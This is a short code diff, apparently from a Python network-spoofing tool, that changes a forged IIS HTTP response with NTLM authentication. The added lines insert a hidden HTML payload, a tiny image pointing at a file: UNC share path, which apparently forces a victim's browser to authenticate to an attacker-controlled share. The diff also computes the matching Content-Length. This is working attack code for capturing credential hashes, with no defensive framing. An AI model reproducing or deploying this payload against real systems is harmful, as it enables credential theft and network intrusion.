@@ -56,9 +56,13 @@ class IIS_Auth_Granted(Packet):
         ("Type",          "Content-Type: text/html\r\n"),
         ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
         ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
-        ("Len",           "Content-Length: 0\r\n"), 
-        ("CRLF",          "\r\n"),                               
+        ("ContentLen",    "Content-Length: "),
+        ("ActualLen",     "76"), 
+        ("CRLF",          "\r\n\r\n"),
+        ("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
     ])
+    def calculate(self):
+        self.fields["ActualLen"] = len(str(self.fields["Payload"]))
 
 #HTTP NTLM Auth
 class NTLM_Challenge(Packet):
